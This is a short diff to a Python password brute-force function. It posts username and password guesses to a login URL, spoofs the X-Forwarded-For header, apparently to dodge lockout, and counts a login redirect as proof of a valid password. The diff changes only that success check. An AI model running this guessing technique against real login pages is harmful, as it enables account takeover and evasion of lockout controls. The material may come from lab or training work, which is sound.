@@ -36,8 +36,9 @@ def guess_password(username):
             header={"X-Forwarded-For": client}
             data = {"username": username, "password": password} 
             response = requests.post(url, cookies=cookies, data=data, headers=header)
-
-            if str(response.history) == "[<Response [302]>]":
+            
+            # The password will be valid if the direction is happened at least one time in the "history" list of the response during logging in.       
+            if len(response.history) == 1:
                 print(colored(f"[+] Valid password is found... ","green"))
                 return password  
             else:
